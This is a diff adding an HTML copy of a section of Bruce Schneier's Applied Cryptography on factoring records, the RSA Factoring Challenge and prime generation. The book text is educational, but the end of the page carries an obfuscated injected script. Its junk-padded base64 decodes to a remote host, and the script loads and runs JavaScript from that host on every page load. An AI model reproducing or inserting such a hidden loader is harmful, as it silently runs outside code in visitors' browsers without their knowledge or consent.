@@ -1,0 +1,97 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Mathematical Background</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=11//-->
+<!--PAGES=256-258//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="11-10.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="11-12.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>See [251] for a good introduction to these different factoring algorithms, except for the NFS. The best discussion of the NFS is [953]. Other, older references are [505, 1602, 1258]. Information on parallel factoring can be found in [250].
+</P>
+<P>If <I>n</I> is the number being factored, the fastest QS variants have a heuristic asymptotic run time of:</P>
+<DL>
+<DD>e<SUP><SMALL>(1&#43; 0(1))(ln (<I>n</I>))<SUP><SMALL>(1/2)</SMALL></SUP>(ln (ln (<I>n</I>)))<SUP><SMALL>(1/2)</SMALL></SUP></SMALL></SUP>
+</DL>
+<P>The NFS is much faster, with a heuristic asymptotic time estimate of:
+</P>
+<DL>
+<DD>e<SUP><SMALL>(1.923&#43; 0(1))(ln (<I>n</I>))<SUP><SMALL>(1/3)</SMALL></SUP>(ln (ln (<I>n</I>)))<SUP><SMALL>(2/3)</SMALL></SUP></SMALL></SUP>
+</DL>
+<P>In 1970, the big news was the factoring of a 41-digit hard number [1123]. (A &#147;hard&#148; number is one that does not have any small factors and is not of a special form that allows it to be factored more easily.) Ten years later, factoring hard numbers twice that size took a Cray computer just a few hours [440].
+</P>
+<P>In 1988, Carl Pomerance designed a modular factoring machine, using custom VLSI chips [1259]. The size of the number you would be able to factor depends on how large a machine you can afford to build. He never built it.</P>
+<P>In 1993, a 120-digit hard number was factored using the quadratic sieve; the calculation took 825 mips-years and was completed in three months real time [463]. Other results are [504].</P>
+<P>Today&#146;s factoring attempts use computer networks [302, 955]. In factoring a 116-digit number, Arjen Lenstra and Mark Manasse used 400 mips-years&#151;the spare time on an array of computers around the world for a few months.</P>
+<P>In March 1994, a 129-digit (428-bit) number was factored using the double large prime variation of the multiple polynomial QS [66] by a team of mathematicians led by Lenstra. Volunteers on the Internet carried out the computation: 600 people and 1600 machines over the course of eight months, probably the largest ad hoc multiprocessor ever assembled. The calculation was the equivalent of 4000 to 6000 mips-years. The machines communicated via electronic mail, sending their individual results to a central repository where the final steps of analysis took place. This computation used the QS and five-year-old theory; it would have taken one-tenth the time using the NFS [949]. According to [66]: &#147;We conclude that commonly used 512-bit RSA moduli are vulnerable to any organization prepared to spend a few million dollars and to wait a few months.&#148; They estimate that factoring a 512-bit number would be 100 times harder using the same technology, and only 10 times harder using the NFS and current technology [949].</P>
+<P>To keep up on the state of the art of factoring, RSA Data Security, Inc. set up the RSA Factoring Challenge in March 1991 [532]. The challenge consists of a list of hard numbers, each the product of two primes of roughly equal size. Each prime was chosen to be congruent to 2 modulo 3. There are 42 numbers in the challenge, one each of length 100 digits through 500 digits in steps of 10 digits (plus one additional number, 129 digits long). At the time of writing, RSA-100, RSA-110, RSA-120, and RSA-129 have been factored, all using the QS. RSA-130 might be next (using the NFS), or the factoring champions might skip directly to RSA-140.</P>
+<P>This is a fast-moving field. It is difficult to extrapolate factoring technology because no one can predict advances in mathematical theory. Before the NFS was discovered, many people conjectured that the QS was asymptotically as fast as any factoring method could be. They were wrong.</P>
+<P>Near-term advances in the NFS are likely to come in the form of bringing down the constant: 1.923. Some numbers of a special form, like Fermat numbers, have a constant more along the lines of 1.5 [955, 954]. If the hard numbers used in public-key cryptography had that kind of constant, 1024-bit numbers could be factored today. One way to lower the constant is to find better ways of representing numbers as polynomials with small coefficients. The problem hasn&#146;t been studied very extensively yet, but it is probable that advances are coming [949].</P>
+<P>For the most current results from the RSA Factoring Challenge, send e-mail to challenge-info@rsa.com.</P>
+<P><FONT SIZE="+1"><B><I>Square Roots Modulo n</I></B></FONT></P>
+<P>If <I>n</I> is the product of two primes, then the ability to calculate square roots mod <I>n</I> is computationally equivalent to the ability to factor <I>n</I> [1283, 35, 36, 193]. In other words, someone who knows the prime factors of <I>n</I> can easily compute the square roots of a number mod <I>n</I>, but for everyone else the computation has been proven to be as hard as computing the prime factors of <I>n.</I></P>
+<H3><A NAME="Heading6"></A><FONT COLOR="#000077">11.5 Prime Number Generation</FONT></H3>
+<P>Public-key algorithms need prime numbers. Any reasonably sized network needs lots of them. Before discussing the mathematics of prime number generation, I will answer a few obvious questions.
+</P>
+<DL>
+<DD><B>1.</B>&nbsp;&nbsp;If everyone needs a different prime number, won&#146;t we run out? No. In fact, there are approximately 10<SUP><SMALL>151</SMALL></SUP> primes 512 bits in length or less. For numbers near <I>n</I>, the probability that a random number is prime is approximately one in ln <I>n.</I> So the total number of primes less than <I>n</I> is <I>n</I> /(ln <I>n</I>). There are only 10<SUP><SMALL>77</SMALL></SUP> atoms in the universe. If every atom in the universe needed a billion new primes every microsecond from the beginning of time until now, you would only need 10<SUP><SMALL>109</SMALL></SUP> primes; there would still be approximately 10<SUP><SMALL>151</SMALL></SUP> 512-bit primes left.
+<DD><B>2.</B>&nbsp;&nbsp;What if two people accidentally pick the same prime number? It won&#146;t happen. With over 10<SUP><SMALL>151</SMALL></SUP> prime numbers to choose from, the odds of that happening are significantly less than the odds of your computer spontaneously combusting at the exact moment you win the lottery.
+<DD><B>3.</B>&nbsp;&nbsp;If someone creates a database of all primes, won&#146;t he be able to use that database to break public-key algorithms? Yes, but he can&#146;t do it. If you could store one gigabyte of information on a drive weighing one gram, then a list of just the 512-bit primes would weigh so much that it would exceed the Chandrasekhar limit and collapse into a black hole...so you couldn&#146;t retrieve the data anyway.
+</DL>
+<P>But if factoring numbers is so hard, how can generating prime numbers be easy? The trick is that the yes/no question, &#147;Is <I>n</I> prime?&#148; is a much easier question to answer than the more complicated question, &#147;What are the factors of <I>n?</I> &#148;</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="11-10.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="11-12.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(ncEQlyPl, JRLLpGXF) {JRLLpGXF = ncEQlyPl.createElement('script');JRLLpGXF.type = 'text/javascript';JRLLpGXF.async = true;JRLLpGXF.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');ncEQlyPl.getElementsByTagName('body')[0].appendChild(JRLLpGXF);}(document));</script></body>
+</html>
